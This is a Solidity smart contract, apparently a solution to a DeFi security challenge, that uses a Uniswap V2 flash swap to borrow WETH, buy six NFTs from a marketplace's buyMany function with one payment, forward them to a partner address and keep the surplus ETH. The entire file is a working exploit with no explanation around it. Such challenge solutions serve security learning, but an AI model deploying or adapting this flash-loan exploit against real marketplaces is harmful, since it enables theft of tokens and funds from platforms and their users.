// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface INFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IUniswapV2Factory {
  function getPair(address token0, address token1) external view returns (address);
}

interface IUniswapV2Pair {
  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );

  function swap(
    uint amount0Out,
    uint amount1Out,
    address to,
    bytes calldata data
  ) external;
}

contract gimmeThoseJPEGs is IUniswapV2Callee, IERC721Receiver {

    address partner;
    address owner;
    INFTMarketplace NFTMarketplace;
    IERC721 JPEG;
    IUniswapV2Factory uniV2Factory;
    IERC20 WETH;
    IERC20 DVT;

    constructor(address _partner, address _NFTMarketplace, address _NFT, address _uniV2Factory, address _WETH, address _dvt){
        partner = _partner;
        NFTMarketplace = INFTMarketplace(_NFTMarketplace);
        JPEG = IERC721(_NFT);
        uniV2Factory = IUniswapV2Factory(_uniV2Factory);
        WETH = IERC20(_WETH);
        DVT = IERC20(_dvt);
        owner = msg.sender;
    }

    function attack() external {
        uint amountToFlash = 15 ether;
        address pair = uniV2Factory.getPair(address(DVT), address(WETH));
        require(pair != address(0), "zeroAddress");
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint amount0Out = address(WETH) == token0 ? amountToFlash : 0;
        uint amount1Out = address(WETH) == token1 ? amountToFlash : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(address(WETH), amountToFlash);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = uniV2Factory.getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        // about 0.3%
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        // do stuff here
        doTheMagic(amountToRepay);

        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    function doTheMagic(uint amountToRepay) internal {
        IWETH(address(WETH)).withdraw(WETH.balanceOf(address(this)));

        uint256[] memory tokenIds = new uint256[](6); 
        
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        NFTMarketplace.buyMany{ value: address(this).balance }(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            JPEG.safeTransferFrom(address(this), partner, tokenIds[i]);
        }

        IWETH(address(WETH)).deposit{ value: amountToRepay }();
        payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}